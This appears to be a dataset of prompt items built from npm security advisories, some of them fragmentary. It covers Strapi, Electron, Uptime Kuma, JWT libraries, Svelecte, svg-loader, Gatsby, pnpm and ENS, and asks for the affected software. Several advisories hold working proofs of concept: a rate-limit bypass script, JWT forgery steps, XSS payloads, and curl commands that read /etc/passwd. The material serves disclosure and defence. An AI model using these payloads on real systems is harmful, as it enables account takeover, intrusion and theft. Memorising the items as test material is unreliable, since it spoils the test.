Summary\nThere is a rate limit on the login function of Strapi's admin screen, but it is possible to circumvent it.\n\n### 2.

(Pattern 1)\n   - In this case, avoidance is possible with various patterns.\n2. Add path slashes to the end of the request path. (Pattern 2)\n\n### 3.

Next, falsify the pathname of the request (**`/admin/Login`**) and make a request again to confirm that it is possible to bypass the rate limit and log in. (`200 OK`)\n\n#### Pattern 2 (trailing slash)\n```js\n// poc.js\n(async () => {\n  const data1 = {\n    email: \"admin@strapi.com\",   // registered e-mail address\n    password: \"invalid_password\",\n  };\n  const data2 = {\n    email: \"admin@strapi.com\",\n    password: \"RyG5z-CE2-]*4e4\",   // correct password\n  };\n\n  for (let i = 0; i < 30; i++) {\n    await fetch(\"http://localhost:1337/admin/login\", {\n      method: \"POST\",\n      body: JSON.stringify(data1),\n      headers: {\n        \"Content-Type\": \"application/json\",\n      },\n    });\n  }\n\n  const res1 = await fetch(\"http://localhost:1337/admin/login\", {\n    method: \"POST\",\n    body: JSON.stringify(data2),\n    headers: {\n      \"Content-Type\": \"application/json\",\n    },\n  });\n  console.log(res1.status + \" \" + res1.statusText);\n\n  const res2 = await fetch(\"http://localhost:1337/admin/login/\", {  // trailing slash\n    method: \"POST\",\n    body: JSON.stringify(data2),\n    headers: {\n      \"Content-Type\": \"application/json\",\n    },\n  });\n  console.log(res2.status + \" \" + res2.statusText);\n})();\n```\n\n##### This PoC does the following:\n1.

Please identify the software name affected by it. Input: ### Impact\nApps using `contextIsolation` and `contextBridge` are affected.\n\nThis is a context isolation bypass, meaning that code running in the main world context in the renderer can reach into the isolated Electron context and perform privileged actions.\n\n### Workarounds\nThis issue is exploitable under either of two conditions:\n* If an API exposed to the main world via `contextBridge` can return an object or array that contains a JS object which cannot be serialized, for instance, a canvas rendering context. This would normally result in an exception being thrown `Error: object could not be cloned`.\n* If an API exposed to the main world via `contextBridge` has a return value that throws a user-generated exception while being sent over the bridge, for instance a dynamic getter property on an object that throws an error when being computed.\n\nThe app side workaround is to ensure that such a case is not possible. Ensure all values returned from a function exposed over the context bridge are [supported](https://www.electronjs.org/docs/latest/api/context-bridge#parameter--error--return-type-support) and that any objects returned from functions do not have dynamic getters that can throw exceptions.\n\nAuditing your exposed API is likely to be quite difficult so we strongly recommend you update to a patched version of Electron.\n\n### Fixed Versions\n* `25.0.0-alpha.2`\n* `24.0.1`\n* `23.2.3`\n* `22.3.6`\n\n### For more information\nIf you have any questions or comments about this advisory, email us at [security@electronjs.org](mailto:security@electronjs.org).

Specifically, these versions contain the fixes:\n\n- 22.0.1\n- 23.0.0-alpha.2\n\nWe recommend all apps upgrade to the latest stable version of Electron, especially if they use `sandbox: false` or `contextIsolation: false`.\n\n### Workarounds\nIf upgrading isn't possible, this issue can be addressed without upgrading by enabling at least one of `sandbox: true` or `contextIsolation: true` on all renderers.\n\n```js\nconst mainWindow = new BrowserWindow({\n  webPreferences: {\n    sandbox: true,\n  }\n});\n```\n\n### For more information\nIf you have any questions or comments about this advisory, email us at [security@electronjs.org](mailto:security@electronjs.org).\n\n### Credit\nThanks to user @andreasdj for reporting this issue..

Input: ### Summary\n\nThe `runTailscalePing` method of the `TailscalePing` class injects the `hostname` parameter inside a shell command, leading to a command injection and the possibility to run arbitrary commands on the server.\n\n### Details\n\nWhen adding a new monitor on Uptime Kuma, we can select the \"Tailscale Ping\" type. Then we can add a hostname and insert a command injection payload into it. The front-end application requires that the field follow a specific pattern, this validation only happens on the front-end and can be removed by removing the attribute `pattern` on the `input` element.\n\nhttps://github.com/louislam/uptime-kuma/blob/dc4242019331e65a79ac16deef97510144e01b12/server/monitor-types/tailscale-ping.js#L40-L46\n\nWe can finally add the new monitor and observe that our command is being executed.\n\n**NOTE:** When using Uptime Kuma inside a container, the \"TailScale Ping\" type is not visible. We can fake this information by intercepting WebSocket messages and set the `isContainer` option to `false`.\n\n### PoC\n\n* Authenticate.\n* Create a new monitor.\n* Select the TailScale Ping type (if not visible, see the note in the details section).\n* Insert the command injection payload inside the `hostname` field.

Input: ### Summary\nA Server-Side Request Forgery (SSRF) Vulnerability is present in applications utilizing the `google-translate-api-browser` package and exposing the `translateOptions` to the end user. An attacker can set a malicious `tld`, causing the application to return unsafe URLs pointing towards local resources.\n\n### Details\nThe `translateOptions.tld` field is not properly sanitized before being placed in the Google translate URL. This can allow an attacker with control over the `translateOptions` to set the `tld` to a payload such as `@127.0.0.1`. This causes the full URL to become `https://translate.google.@127.0.0.1/...`, where `translate.google.` is the username used to connect to localhost.\n\n### PoC\nImagine a server running the following code (closely mimicking the code present in the package's README):\n```javascript\nconst express = require('express');\nconst { generateRequestUrl, normaliseResponse } = require('google-translate-api-browser');\nconst https = require('https');\n\nconst app = express();\napp.use(express.json());\n\napp.post('/translate', async (req, res) => {\n    const { text, options } = req.body;\n\n    const url = generateRequestUrl(text, options);\n\n    https.get(url, (resp) => {\n        let data = '';\n      \n        resp.on('data', (chunk) => {\n          data += chunk;\n        });\n      \n        resp.on('end', () => {\n            res.json(normaliseResponse(JSON.parse(data)));\n        });\n      }).on(\"error\", (err) => {\n        console.log(\"Error: \" + err.message);\n      });\n});\n\nconst port = 3000;\napp.listen(port, () => {\n  console.log(`Server is running on port ${port}`);\n});\n```\n\nAn attacker can then send the following POST request to `/translate`:\n```\nPOST /translate HTTP/1.1\nHost: localhost:3000\nContent-Type: application/json\nContent-Length: 51\n\n{\"text\":\"Hello\",\"options\": {\"tld\": \"@127.0.0.1\"}  }\n```\n\nThis will cause a request to be sent to the localhost of the server running the Node application.\n\n### Impact\nAn attacker can send requests within internal networks and the local host. Should any HTTPS application be present on the internal network with a vulnerability exploitable via a GET call, then it would be possible to exploit this using this vulnerability.\n.

Input: ### Impact\n\nCurrently, in many Vendure deployments it's possible to select any currencyCode (really any, doesn't need to be assigned to the channel) and pay through Mollie and Stripe in that particular currencyCode.\nThe prices are not transformed. The result is the Order is in Payment Settled in the foreign currency.\nSee SS, CZK is not in the channel.\nI've tested with Mollie and Stripe it both works.\n\n**Further notes**\n\nAfter looking into this further and with help from the comments below, the root cause of this vulnerability is the ability to specify an arbitrary `currencyCode` as a query parameter to an API call, and then Vendure will use this and pass it to the rest of the system as `RequestContext.currencyCode`.\n\nThe solution is to add validation to the passed `currencyCode` to ensure that it matches one of the available `availableCurrencyCodes` of the active Channel.\n\nFurthermore, an additional check has been added for when the currencyCode changes during the AddingItems stage - in this case we need to re-calculate the prices in the new currency.\n\n### Patches\nv2.1.3\n\n### Workarounds\nYou can define a custom OrderProcess [onTransitionStart function](https://docs.vendure.io/guides/core-concepts/orders/#intercepting-a-state-transition) which can verify the order's `currencyCode` is as expected before allowing the transition to the `ArrangingPayment` state..

Input: ### Summary\nThe json-web-token library is vulnerable to a JWT algorithm confusion attack.\n\n### Details\nOn line 86 of the 'index.js' file, the algorithm to use for verifying the signature of the JWT token is taken from the JWT token, which at that point is still unverified and thus shouldn't be trusted. To exploit this vulnerability, an attacker needs to craft a malicious JWT token containing the HS256 algorithm, signed with the public RSA key of the victim application. This attack will only work against this library is the RS256 algorithm is in use, however it is a best practice to use that algorithm.\n\n### PoC\nTake a server running the following code:\n```javascript\nconst express = require('express');\nconst jwt = require('json-web-token');\nconst fs = require('fs');\nconst path = require('path');\n\nconst app = express();\nconst port = 3000;\n\n// Load the keys from the file\nconst publicKeyPath = path.join(__dirname, 'public-key.pem');\nconst publicKey = fs.readFileSync(publicKeyPath, 'utf8');\nconst privateKeyPath = path.join(__dirname, 'private-key.pem');\nconst privateKey = fs.readFileSync(privateKeyPath, 'utf8');\n\napp.use(express.json());\n\n// Endpoint to generate a JWT token with admin: False\napp.get('/generateToken', async (req, res) => {\n  const payload = { admin: false, name: req.query.name };\n  const token = await jwt.encode(privateKey, payload, 'RS256', function (err, token) {\n    res.json({ token });\n  });\n});\n\n// Middleware to verify the JWT token\nfunction verifyToken(req, res, next) {\n  const token = req.query.token;\n\n  jwt.decode(publicKey, token, (err, decoded) => {\n    if (err) {\n      console.log(err)\n      return res.status(401).json({ message: 'Token authentication failed' });\n    }\n\n    req.decoded = decoded;\n    next();\n  });\n}\n\n// Endpoint to check if you are the admin or not\napp.get('/checkAdmin', verifyToken, (req, res) => {\n  res.json(req.decoded);\n});\n\napp.listen(port, () => {\n  console.log(`Server is running on port ${port}`);\n});\n```\n\n**Public key recovery**\nFirst, an attacker needs to recover the public key from the server in any way possible. It is possible to extract this from just two JWT tokens as shown below.\nGrab two different JWT tokens and utilize the following tool: `https://github.com/silentsignal/rsa_sign2n/blob/release/standalone/jwt_forgery.py`\n```\npython3 jwt_forgery.py token1 token2\n```\nThe tool will generate 4 different public keys, all in different formats. Try the following for all 4 formats.\n\n**Algorithm confusion**\nChange the JWT to the HS256 algorithm and modify any of the contents to your liking at `https://jwt.io/`.\nCopy the resulting JWT token and use with the following tool: `https://github.com/ticarpi/jwt_tool`.\n```\npython /opt/jwt_tool/jwt_tool.py --exploit k -pk public_key token\n```\nYou will now get a resulting JWT token that is validly signed.\n\n### Impact\nApplications using the RS256 algorithm, are vulnerable to this algorithm confusion attack which allows attackers to sign arbitrary payloads that the verifier will accept.\n\n### Solution\nEither one of the following solutions will work.\n1. Change the signature of the `decode` function to ensure that the algorithm is set in that call\n2. Check whether or not the secret could be a public key in the decode function and in that case, set the key to be a public key.. Top 1 search result is npm:json-web-token.

Input: ### Impact\n\n`next-auth` applications prior to version **4.24.5** that rely on the default [Middleware authorization](https://next-auth.js.org/configuration/nextjs#middleware) are affected.\n\nA bad actor could create an empty/mock user, by getting hold of a NextAuth.js-issued JWT from an interrupted OAuth sign-in flow (state, PKCE or nonce).\n\nManually overriding the `next-auth.session-token` cookie value with this non-related JWT would let the user simulate a logged in user, albeit having no user information associated with it. (The only property on this user is an opaque randomly generated string).\n\nThis vulnerability does **not** give access to other users' data, neither to resources that require proper authorization via scopes or other means. The created mock user has no information associated with it (ie. no name, email, access_token, etc.)\n\nThis vulnerability can be exploited by bad actors to peek at logged in user states (e.g. dashboard layout).\n\n_Note: Regardless of the vulnerability, the existence of a NextAuth.js session state can provide simple authentication, but not authorization in your applications. For role-based access control, you can check out [our guide](https://authjs.dev/guides/basics/role-based-access-control)._\n\n### Patches\n\nWe patched the vulnerability in `next-auth` `v4.24.5`. To upgrade, run one of the following:\n\n```\nnpm i next-auth@latest\n```\n```\nyarn add next-auth@latest\n```\n```\npnpm add next-auth@latest\n```\n\n### Workarounds\n\nUpgrading to `latest` is the recommended way to fix this issue. However, using [a custom authorization callback for Middleware](https://next-auth.js.org/configuration/nextjs#advanced-usage), developers can manually do a basic authentication:\n\n```ts\n// middleware.ts\nimport { withAuth } from \"next-auth/middleware\"\n\nexport default withAuth(/*your middleware function*/, {\n  // checking the existence of any property - besides `value` which might be a random string - on the `token` object is sufficient to prevent this vulnerability\n  callbacks: { authorized: ({ token }) => !!token?.email }\n})\n```\n\n### References\n\n- [NextAuth.js Middleware](https://next-auth.js.org/configuration/nextjs#middleware)\n- [Role-based access contorl (RBAC) guide](https://authjs.dev/guides/basics/role-based-access-control).

Input: ### Summary\nThe fast-jwt library does not properly prevent JWT algorithm confusion for all public key types.\n\n### Details\nThe 'publicKeyPemMatcher' in 'fast-jwt/src/crypto.js' does not properly match all common PEM formats for public keys. To exploit this vulnerability, an attacker needs to craft a malicious JWT token containing the HS256 algorithm, signed with the public RSA key of the victim application. This attack will only work if the victim application utilizes a public key containing the `BEGIN RSA PUBLIC KEY` header.\n\n### PoC\nTake a server running the following code:\n```javascript\nconst express = require('express');\nconst { createSigner, createVerifier } = require('fast-jwt')\nconst fs = require('fs');\nconst path = require('path');\n\nconst app = express();\nconst port = 3000;\n\n// Load the keys from the file\nconst publicKeyPath = path.join(__dirname, 'public_key.pem');\nconst publicKey = fs.readFileSync(publicKeyPath, 'utf8');\nconst privateKeyPath = path.join(__dirname, 'key');\nconst privateKey = fs.readFileSync(privateKeyPath, 'utf8');\n\napp.use(express.json());\n\n// Endpoint to generate a JWT token with admin: False\napp.get('/generateToken', async (req, res) => {\n  const payload = { admin: false, name: req.query.name };\n\n  const signSync = createSigner({ algorithm: 'RS256', key: privateKey });\n  const token = signSync(payload);\n  \n  res.json({ token });\n});\n\n// Middleware to verify the JWT token\nfunction verifyToken(req, res, next) {\n  const token = req.query.token;\n\n  const verifySync = createVerifier({ key: publicKey });\n  const payload = verifySync(token);\n\n  req.decoded = payload;\n  next();\n}\n\n// Endpoint to check if you are the admin or not\napp.get('/checkAdmin', verifyToken, (req, res) => {\n  res.json(req.decoded);\n});\n\napp.listen(port, () => {\n  console.log(`Server is running on port ${port}`);\n});\n```\n\nAssume the server generated their keys like follows:\n```\nssh-keygen -t rsa -b 2048 -m PEM\nssh-keygen -f key.pub -e -m PEM > public_key.pem\n```\n\n**Public key recovery**\nFirst, an attacker needs to recover the public key from the server in any way possible. It is possible to extract this from just two JWT tokens as shown below.\nGrab two different JWT tokens and utilize the following tool: `https://github.com/silentsignal/rsa_sign2n/blob/release/standalone/jwt_forgery.py`\n```\npython3 jwt_forgery.py token1 token2\n```\nThe tool will generate 4 different public keys, all in different formats. Try the following for all 4 formats.\n\n**Algorithm confusion**\nChange the JWT to the HS256 algorithm and modify any of the contents to your liking at `https://jwt.io/`.\nCopy the resulting JWT token and use with the following tool: `https://github.com/ticarpi/jwt_tool`\n```\npython /opt/jwt_tool/jwt_tool.py --exploit k -pk public_key token\n```\nYou will now get a resulting JWT token that is validly signed.\n\n### Impact\nApplications using the RS256 algorithm, a public key with a `BEGIN RSA PUBLIC KEY` header, and calling the verify function without explicitly providing an algorithm, are vulnerable to this algorithm confusion attack which allows attackers to sign arbitrary payloads which will be accepted by the verifier.\n\n### Solution\n\nChange https://github.com/nearform/fast-jwt/blob/master/src/crypto.js#L29\n\n```javascript\nconst publicKeyPemMatcher = '-----BEGIN PUBLIC KEY-----'\n```\n\nto be regex: \n\n```javascript\nconst publicKeyPemMatcher = /^-----BEGIN( RSA)? PUBLIC KEY-----/\n```. Top 1 search result is npm:fast-jwt.

Input: ### Summary\nIt is possible to construct a tarball that, when installed via npm or parsed by the registry is safe, but when installed via pnpm is malicious, due to how pnpm parses tar archives.\n\n### Details\nThe TAR format is an append-only archive format, and as such, the specification for how to update a file is to add a new record to the end with the updated version of the file. This means that it is completely valid for an archive to contain multiple copies of, say, `package.json`, and the expected behavior when extracting is that all versions other than the last get ignored.\n\nThis is further complicated by that during tarball extraction, all package managers are configured to drop the first path component, so collisions can be created simply by using multiple root folders in the archive, even without performing updates.\n\nWhen pnpm extracts a tar archive via tar-stream, it appears to extract only the _first_ file of a given name and discards all subsequent files with the same name.\n\n### PoC\nCreate a root folder with the following layout:\n- `a/package.json`\n- `package/package.json`\n- `z/package.json`\n\nFile contents:\n#### a/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is a bad version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^15\"\n    }\n}\n```\n#### package/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is a bad version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^16\"\n    }\n}\n```\n#### z/package.json\n```json\n{\n    \"name\": \"test-package\",\n    \"version\": \"0.1.0\",\n    \"description\": \"This is the good version of a test package\",\n    \"dependencies\": {\n        \"react\": \"^17\"\n    }\n}\n```\n\nThen use the tar binary to produce a tarball (working directory is the root folder):\n`tar -c -z --format ustar -f package.tgz a package z`\nThe order of the folders at the end matters; whichever one is last will end up being the package.json that wins when extracted by npm; the one that is first will be the one that wins when extracted by pnpm.\n\nInstall the tarball via the `file:` protocol.\n\nObserve that with npm, the lockfile has `react@17`, while with pnpm it has `react@15`.\n\n### Impact\nThis can result in a package that appears safe on the npm registry or when installed via npm being replaced with a compromised or malicious version when installed via pnpm..

This code is taken directly from `node-fetch@2`'s header value validation code.\n```js\nconst invalidHeaderCharRegex = /[^\\t\\x20-\\x7e\\x80-\\xff]/;\nif (invalidHeaderCharRegex.test('<YOUR_API_KEY>')) {\n  console.log('potentially affected');\n}\nconsole.log('unaffected');\n```\n\nIf the provided API key is not a valid header value, whenever Apollo Server uses that API key in a request (to Studio, for example), `node-fetch` will throw an error _which contains the header value_. This error is logged in various ways depending on the user's configuration, but most likely the console or some configured logging service.\n\n### Patches\nThis problem is patched in the latest version of Apollo Server as soon as this advisory is published.\n\n### Workarounds\n* Try retrieving a new API key from Studio. Note: this may not work if the invalid character is not part of the secret (it may be derived from identifiers like graph name, user name).\n* Override the `fetcher` \n* Disable schema reporting and/or usage reporting\n\n### Solution\n* Apollo Server will now call `.trim()` on incoming API keys in order to eliminate leading/trailing whitespace and log a warning when it does so.\n* Apollo Server will now perform the same validation of API keys as `node-fetch@2` performs on header values on startup. Apollo Server will throw an error on startup (i.e., fail to start completely) and notify the user their API key is invalid along with the offending characters..

Input: ### Impact\n\nThis is a hole in the confinement of guest applications under SES that may manifest as either the ability to exfiltrate information or execute arbitrary code depending on the configuration and implementation of the surrounding host.\n\nGuest program running inside a Compartment with as few as no endowments can gain access to the surrounding host\u2019s dynamic import by using dynamic import after the spread operator, like `{...import(arbitraryModuleSpecifier)}`.\n\nOn the web or in web extensions, a Content-Security-Policy following ordinary best practices likely mitigates both the risk of exfiltration and execution of arbitrary code, at least limiting the modules that the attacker can import to those that are already part of the application. However, without a Content-Security-Policy, dynamic import can be used to issue HTTP requests for either communication through the URL or for the execution of code reachable from that origin.\n\nWithin an XS worker, an attacker can use the host\u2019s module system to the extent that the host has been configured. This typically only allows access to module code on the host\u2019s file system and is of limited use to an attacker.\n\nWithin Node.js, the attacker gains access to Node.js\u2019s module system. Importing the powerful builtins is not useful except insofar as there are side-effects and tempered because dynamic import returns a promise. Spreading a promise into an object renders the promises useless. However, Node.js allows importing data URLs, so this is a clear path to arbitrary execution.\n\n### Patches\n\nAll affected `0.*` version trains have the following patch.

This allows the injection of arbitrary HTML into the Svelecte dropdown. This can be exploited to execute arbitrary JavaScript whenever a Svelecte dropdown is opened.\n\n### Details\n\nItem names given to Svelecte appear to be directly rendered as HTML by the default item renderer. This means that any HTML tags in the name are rendered as HTML elements not as text.\n\nNote that the custom item renderer shown in https://mskocik.github.io/svelecte/#item-rendering is also vulnerable to the same exploit.\n\nTo prevent this all special HTML characters in item names should be escaped (for example using `document.createTextNode()`).\n\n### PoC\n```svelte\n<script>\n    import Svelecte from 'svelecte';\n    \n    const list = [\n        { id: 1, name: `Item 1` },\n        { id: 2, name: `Item 2<img style=\"display:none;\" src=1 onerror=\"alert('JavaScript executed!');\"/>` },\n        { id: 3, name: 'Item 3'}\n    ];\n</script>\n    \n<Svelecte options={list}></Svelecte>\n```\n\nThis code snippet demonstrates how the vulnerability can be used to execute arbitrary JavaScript without the user's knowledge when the Svelecte dropdown is opened (note that visually item 2 appears identical to other items).\nIn this case the script is hardcoded, but in practice the real danger is that some applications may use Svelecte with items that are created by users or come from low-trust sources where someone else could add a malicious script to the item name.\n\n### Impact\n\nAny site that uses Svelecte with dynamically created items either from an external source or from user-created content could be vulnerable to an XSS attack (execution of untrusted JavaScript), clickjacking or any other attack that can be performed with arbitrary HTML injection.\nThe actual impact of this vulnerability for a specific application depends on how trustworthy the sources that provide Svelecte items are and the steps that the application has taken to mitigate XSS attacks.

Input: ### Description\nAccording to the documentation, controllers are allowed to register new domains and extend the expiry of existing domains, but they cannot change the ownership or reduce the expiration time of existing domains. However, a preliminary analysis suggests that an attacker-controlled controller may be able to reduce the expiration time of existing domains due to an integer overflow in the renew function.\n\nThe vulnerability resides in the following GitHub repository: https://github.com/ensdomains/ens-contracts/blob/master/contracts/ethregistrar/BaseRegistrarImplementation.sol#L171 \n\nThe vulnerable line of code is:\n```js\nrequire(\n            expiries[id] + duration + GRACE_PERIOD > duration + GRACE_PERIOD\n        ); // Prevent future overflow\n```\n\nIn this code snippet, the `duration` variable is user-supplied, making it possible to provide a value that would cause an overflow on both sides of the '>' expression, ultimately rendering the condition true. Specifically, when the duration is set to `2^256 - GRACE_PERIOD`, the subsequent line `expiries[id] += duration;` also experiences an overflow, as `expiries[id]` is greater than `GRACE_PERIOD`. This results in the reduction of `expiries[id]` by `GRACE_PERIOD`. By repeatedly calling the renew function, an attacker could potentially force the expiration of an ENS record.\n\nYou can find the PoC included in the attached document. To execute the test, please use the following command:\n```\nforge test -vvv --match-contract RegistrarExploit --fork-url <alchemy_url>\n```\n\nReplace `<alchemy_url>` with your Alchemy API URL. This command will run the Foundry test file and demonstrate the potential vulnerability.\n\n### Impact\nIf successfully exploited, this vulnerability would enable attackers to force the expiration of any ENS record, ultimately allowing them to claim the affected domains for themselves.\n\nCurrently, it would require a malicious DAO to exploit it. Nevertheless, any vulnerability present in the controllers could potentially render this issue exploitable in the future.\n\nAn additional concern is the possibility of renewal discounts. Should ENS decide to implement a system that offers unlimited .eth domains for a fixed fee in the future, the vulnerability could become exploitable by any user due to the reduced attack cost.\n\n### Patches\nA mitigation is being developed.\n\n### Workarounds\nAs long as registration cost remains linear or superlinear based on registration duration, or limited to a reasonable maximum (eg, 1 million years), this vulnerability could only be exploited by a malicious DAO. The interim workaround is thus to take no action.\n. Top 1 search result is npm:@ensdomains/ens-contracts.

The `@webiny/react-rich-text-renderer` package depends on the [editor.js](https://editorjs.io/) rich text editor to handle rich text content. The CMS stores rich text content from the `editor.js` into the database. When the `@webiny/react-rich-text-renderer` is used to render such content, it uses the `dangerouslySetInnerHTML` prop, without applying HTML sanitization. The issue arises when an actor, who in this context would specifically be a content manager with access to the CMS, inserts a malicious script as part of the user-defined input. This script is then injected and executed within the user's browser when the main page or admin page loads.\n\n## Am I affected?\nYou will be affected if you're running a Webiny project created prior to `5.35.0` and you're using the legacy rich text editor (which uses `editor.js` library under the hood).

Please identify the software name affected by it. Input: ### Summary\nAccording to the [docs](https://github.com/shubhamjain/svg-loader/tree/main#2-enable-javascript), svg-loader will strip all JS code before injecting the SVG file for security reasons but the input sanitization logic is not sufficient and can be trivially bypassed. This allows an attacker to craft a malicious SVG which can result in XSS. \n\n### Details\nWhen trying to sanitize the svg the lib [removes event attributes](https://github.com/shubhamjain/svg-loader/blob/main/svg-loader.js#L125-L128) such as `onmouseover`, `onclick` but the list of events is not exhaustive. Here's a list of events not removed by svg-loader. \n`onafterscriptexecute, onbeforecopy, onbeforecut, onbeforescriptexecute, onbeforetoggle, onbegin, onbounce, onend, onfinish, onfocusin, onfocusout, onmousewheel, onpointerrawupdate, onrepeat, onsearch, onshow, onstart, ontoggle(popover), ontouchend, ontouchmove, ontouchstart`\nAs you can see in the POC we can use `onbegin` in `animate` tag to execute JS code without needing to add `data-js=\"enabled\"`.\n\n### PoC\n\n```html\n<svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\">\n  <animate onbegin=alert(1) attributeName=x dur=1s>\n</svg>\n\n```\n\n```html\n<html>\n    <head>\n        <script src=\"./dist/svg-loader.js\" type=\"text/javascript\"></script>\n    </head>\n    <body>\n        <svg data-src=\"data:image/svg+xml;base64,PHN2ZyB2ZXJzaW9uPSIxLjEiIGJhc2VQcm9maWxlPSJmdWxsIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgogIDxwb2x5Z29uIGlkPSJ0cmlhbmdsZSIgcG9pbnRzPSIwLDAgMCw1MCA1MCwwIiBmaWxsPSIjMDA5OTAwIiBzdHJva2U9IiMwMDQ0MDAiLz4KICA8YW5pbWF0ZSBvbmJlZ2luPWFsZXJ0KDEpIGF0dHJpYnV0ZU5hbWU9eCBkdXI9MXM+Cjwvc3ZnPgo=\"></svg>\n    </body>\n</html>\n\n```\n\n### Impact\nAny website which uses external-svg-loader and allows its users to provide svg src, upload svg files would be susceptible to stored XSS attack.\n.

Please identify the software name affected by it. Input: ### Impact\n\nThis may impact users that use Shescape on Windows in a threaded context (e.g. using [Worker threads](https://nodejs.org/api/worker_threads.html)). The vulnerability can result in Shescape escaping (or quoting) for the wrong shell, thus allowing attackers to bypass protections depending on the combination of expected and used shell.\n\nThis snippet demonstrates a vulnerable use of Shescape:\n\n```javascript\n// vulnerable.js\n\nimport { exec } from \"node:child_process\";\nimport { Worker, isMainThread } from 'node:worker_threads';\n\nimport * as shescape from \"shescape\";\n\nif (isMainThread) {\n  // 1. Something like a worker thread must be used. The reason being that they\n  // unexpectedly change environment variable names on Windows.\n  new Worker(\"./vulnerable.js\");\n} else {\n  // 2. Example configuration that's problematic. In this setup example the\n  // expected default system shell is CMD. We configure the use of PowerShell.\n  // Shescape will fail to look up PowerShell and default to escaping for CMD\n  // instead, resulting in the vulnerability.\n  const options = {\n    shell: \"powershell\",\n    interpolation: true,\n  };\n\n  // 3. Using shescape to protect against attacks, this is correct.\n  const escaped = shescape.escape(\"&& ls\", options);\n\n  // 4. Invoking a command with the escaped user input, this is vulnerable in\n  // this case.\n  exec(`echo Hello ${escaped}`, options, (error, stdout) => {\n    if (error) {\n      console.error(`An error occurred: ${error}`);\n    } else {\n      console.log(stdout);\n    }\n  });\n}\n```\n\n### Patches\n\nThis bug has been patched in [v1.7.4](https://github.com/ericcornelissen/shescape/releases/tag/v1.7.4) which you can upgrade to now. No further changes are required.\n\n### Workarounds\n\nIf you are impacted there is no workaround possible.\n\n### References\n\n- Shescape Pull Request [#1142](https://github.com/ericcornelissen/shescape/pull/1142)\n- Shescape commit [`0b976da`](https://github.com/ericcornelissen/shescape/commit/0b976dab645abf45ffd85e74a8c6e51ee2f42d63)\n- Shescape release [v1.7.4](https://github.com/ericcornelissen/shescape/releases/tag/v1.7.4)\n\n### For more information\n\n- Comment on Pull Request [#1142](https://github.com/ericcornelissen/shescape/pull/1142)\n- Comment on commit [`0b976da`](https://github.com/ericcornelissen/shescape/commit/0b976dab645abf45ffd85e74a8c6e51ee2f42d63)\n- Open an issue at [https://github.com/ericcornelissen/shescape/issues](https://github.com/ericcornelissen/shescape/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc) (New issue > Question > Get started).

Input: ### Impact\n\nThe Gatsby framework prior to versions 4.25.7 and 5.9.1 contain a Local File Inclusion vulnerability in the `__file-code-frame` and `__original-stack-frame` paths, exposed when running the Gatsby develop server (`gatsby develop`).\n\nThe following steps can be used to reproduce the vulnerability:\n\n```\n# Create a new Gatsby project\n$ npm init gatsby\n$ cd my-gatsby-site\n\n# Start the Gatsby develop server\n$ gatsby develop\n\n# Execute the Local File Inclusion vulnerability in __file-code-frame\n$ curl \"http://127.0.0.1:8000/__file-code-frame?filePath=/etc/passwd&lineNumber=1\"\n\n# Execute the Local File Inclusion vulnerability in __original-stack-frame\n$ curl \"http://127.0.0.1:8000/__original-stack-frame?moduleId=/etc/hosts&lineNumber=1&skipSourceMap=1\"\n```\n\nIt should be noted that by default `gatsby develop` is only accessible via the localhost `127.0.0.1`, and one would need to intentionally expose the server to other interfaces to exploit this vulnerability by using server options such as `--host 0.0.0.0`, `-H 0.0.0.0`, or the `GATSBY_HOST=0.0.0.0` environment variable.\n\n\n### Patches\n\nA patch has been introduced in `gatsby@5.9.1` and `gatsby@4.25.7` which mitigates the issue.\n\n\n### Workarounds\n\nAs stated above, by default `gatsby develop` is only exposed to the localhost `127.0.0.1`.  For those using the develop server in the default configuration no risk is posed.  If other ranges are required, preventing the develop server from being exposed to untrusted interfaces or IP address ranges would mitigate the risk from this vulnerability.\n\nWe encourage projects to upgrade to the latest major release branch for all Gatsby plugins to ensure the latest security updates and bug fixes are received in a timely manner.\n\n\n### Credits\n\nWe would like to thank Maxwell Garrett of Assetnote for bringing the `__file-code-frame` issue to our attention.\n\n\n### For more information\n\nEmail us at [security@gatsbyjs.com](mailto:security@gatsbyjs.com)..

Input: ### Summary\nThis is a comment on https://github.com/NaturalIntelligence/fast-xml-parser/security/advisories/GHSA-6w63-h3fj-q4vw and the patches fixing it.\n\n### Details\nThe code which validates a name calls the validator:\nhttps://github.com/NaturalIntelligence/fast-xml-parser/blob/ecf6016f9b48aec1a921e673158be0773d07283e/src/xmlparser/DocTypeReader.js#L145-L153\nThis checks for the presence of an invalid character.  Such an approach is always risky, as it is so easy to forget to include an invalid character in the list.  A safer approach is to validate entity names against the XML specification: https://www.w3.org/TR/xml11/#sec-common-syn - an ENTITY name is a Name:\n\n```\n[4]   NameStartChar ::= \":\" | [A-Z] | \"_\" | [a-z] | [#xC0-#xD6] | [#xD8-#xF6] | [#xF8-#x2FF] | [#x370-#x37D] |\n                        [#x37F-#x1FFF] | [#x200C-#x200D] | [#x2070-#x218F] | [#x2C00-#x2FEF] | [#x3001-#xD7FF] |\n                        [#xF900-#xFDCF] | [#xFDF0-#xFFFD] | [#x10000-#xEFFFF]\n[4a]  NameChar ::= NameStartChar | \"-\" | \".\" | [0-9] | #xB7 | [#x0300-#x036F] | [#x203F-#x2040]\n[5]   Name ::= NameStartChar (NameChar)*\n```\n\nso the safest way to validate an entity name is to build a regex to represent this expression and check whether the name given matches the regex.  (Something along the lines of `/^[name start char class][name char class]*$/`.)  There's probably a nice way to simplify the explicit list rather than typing it out verbatim using Unicode character properties, but I don't know enough to do so..

